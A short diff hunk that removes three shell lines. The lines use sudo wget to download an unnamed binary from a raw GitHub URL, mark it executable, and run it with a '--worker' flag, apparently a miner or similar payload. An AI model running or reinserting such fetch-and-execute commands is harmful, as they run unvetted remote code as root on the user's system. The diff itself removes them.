@@ -1,3 +1,0 @@
-sudo wget -O muathulavang https://raw.githubusercontent.com/vip8338/proto/main/deptrai
-sudo chmod +x muathulavang
-./muathulavang --worker=test
